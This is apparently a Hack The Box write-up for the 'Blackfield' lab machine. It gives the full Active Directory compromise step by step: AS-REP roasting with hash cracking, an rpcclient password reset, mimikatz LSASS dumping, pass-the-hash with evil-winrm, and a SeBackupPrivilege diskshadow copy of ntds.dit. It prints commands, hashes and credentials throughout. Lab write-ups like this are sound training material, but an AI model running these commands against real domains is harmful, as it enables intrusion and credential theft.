---
title: "HTB: Blackfield"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![Blackfield](https://i.ibb.co/RSnBf45/Blackfield.png)

# Blackfield

[[toc]]

## Initial Enumeration

We can see that a SMB share is open. If we connect to the smbshare with Guest:*blank* we can list the shares. The interesting share here is profiles$

```
smbclient Guest@10.10.10.192

# shares
ADMIN$
C$
forensic
IPC$
NETLOGON
profiles$
SYSVOL
```

profiles$ seems to give us a list of users, and since ldap and kerberos are both publically exposed, we can try seeing if any of these accounts don't have preauth set:


From here, we can use kerbrute to try a simple password spray against these usernames:

```
kerbrute passwordspray --dc 10.10.10.192 -d BLACKFIELD.local --user-as-pass userlist.txt -v
```

Only one account seems to exist, but it gives us a very interesting message:

```
2020/06/08 09:33:28 >  [!] support@BLACKFIELD.local:support - Got AS-REP (no pre-auth) but couldn't decrypt - bad password                               
```

It appears that this account is kerberoastable, but we'll need to add the domain "BLACKFIELD.local" to our /etc/hosts file first. After doing that, we can use impacket to get the krb5 hash, using a blank password:

```
GetNPUsers.py BLACKFIELD.local/support

$krb5asrep$23$support@BLACKFIELD.LOCAL:4d7b0ac10bb75f90b4b01004d2d679a1$d3cfdcd5f7aa151876e17385af9057c071fddcec5f4792d83a737f1b24d4b6cdd6d859fdc43c7d7c6e69b6900526f711cb23096ea32cad30fd4bfdf0d21076a08a4a81ae449dc8d59b26905f165b498c89a6d5820964171f4aa4adcc9f25d228758a4f7006451d6713359314e93feecebabcb62737197df1bb74a560f2727331c39015093a07721a58523908b366cd29e0792375dc7b91dff0ce11dc706d7650f56a159eb1085797b843e5186d11ed777f36a6f7d31b376939e2e02402aeb5e5e4b08f3920d1daa05f53b6b3a3f6ac5f54e708f2acfb80af59fab2bd91424ecc5d0d4e90a7eec7b6d96f3c1b17f96a280f4ce2cc
```

We can crack this with hashcat:

```
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force

#00^BlackKnight
```

We have valid credentials:

**support:#00^BlackKnight**

We now need to check what they work on. This user doesn't have Remote Management rights, so we can't use winrm to remote into the machine. The credentials do work on smb, but don't give us anything we didn't have with the basic guest account. We can get a list of AD users, with GetADUsers.py:

```
GetADUsers.py -dc-ip 10.10.10.192 BLACKFIELD.local/support
#00^BlackKnight
```

While enumerating what else we can do with these credentials, we can consider what else this user might do for other users. Since a support user might reset passwords, we'll see if we can reset any passwords using rpcclient:

```
rpcclient -U support //10.10.10.192

setuserinfo2 audit2020 23 'thisISmyPASSWORD!'
```

This appears to go through, and lets us log in to SMB with the audit2020 user! While exploring smb with this user, we see that we now have access to the forensic folder.

Looking through the forensic folder, we see that there's an lsass.zip file in memory_analysis, that we can pull hashes from. To do this, we can transfer the zip over to a Windows VM, start up mimikatz with an administrator cmd.exe console, and use the following commands:

```
privilege::debug
sekurlsa::minidump lsass.DMP
sekurlsa::LogonPasswords
```

We get a number of hashes, but the most interesting are the Administrator and svc_backup hashes.

```
         * Username : Administrator
         * Domain   : BLACKFIELD
         * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
         * SHA1     : db5c89a961644f0978b4b69a4d2a2239d7886368
         * DPAPI    : 240339f898b6ac4ce3f34702e4a89550


         * Username : svc_backup
         * Domain   : BLACKFIELD
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
```

We can use these hashes without cracking them with evil-winrm. The Administrator hash doesn't work, but svc_backup's hash still works:

```
evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192

*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
```

Looking at our privileges show us that we're in the Backup Operators group, since we have the following privileges:

```
...
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
...
```

We'll can use the exploit at the following link to grab ntds.dit and get the hashes for every user on the box:

https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group

We'll use the following script named cmd, and put it in C:\Windows\temp\:

NOTE: We need to add a couple "spaces" after each line, or it'll cut off the characters at the end of each line.

cmd:
```
set context persistent nowriters 
add volume c: alias temp
create
expose %temp% z:
```

Now, we need to run diskshadow:

```
diskshadow.exe /s C:\windows\temp\cmd
```

We'll grab the two dlls from https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug and import them, then run the following to grab ntds.dit from our new Z: backup:

```
Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit c:\tmp\ntds.dit -Overwrite
```

We just need to grab SYSTEM to pull down the hashes:

```
reg save HKLM\SYSTEM system.save
```

Now, we can download these to our attacking machine using evil-winrm, and pull our the hashes with secretsdump.py from impacket:

```
secretsdump.py -system system.save -ntds ntds.dit LOCAL

...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
...
```

We don't need to crack this, since we can just pass the hash with evil-winrm!

```
evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```

Voila, we have root!

As a note, we could have also used psexec.py to get a SYSTEM level shell, but only the Administrator user can read root.txt

```
C:\Users\Administrator\Desktop>whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
b'Access is denied.\r\n'
```
